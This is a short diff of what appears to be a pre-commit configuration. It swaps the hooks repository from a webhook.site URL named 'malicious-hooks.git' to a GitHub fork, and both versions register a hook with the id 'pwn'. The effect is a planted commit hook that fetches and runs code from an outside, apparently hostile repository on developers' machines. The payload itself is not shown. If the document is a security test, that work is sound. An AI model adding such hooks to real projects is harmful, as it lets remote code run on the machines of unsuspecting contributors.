@@ -27,7 +27,7 @@
 # /WARNING!
 
 repos:
-  - repo: https://webhook.site/TestActions/malicious-hooks.git
+  - repo: https://github.com/cx-raphael-silva/Open-Assistant.git
     rev: main
     hooks:
       - id: pwn
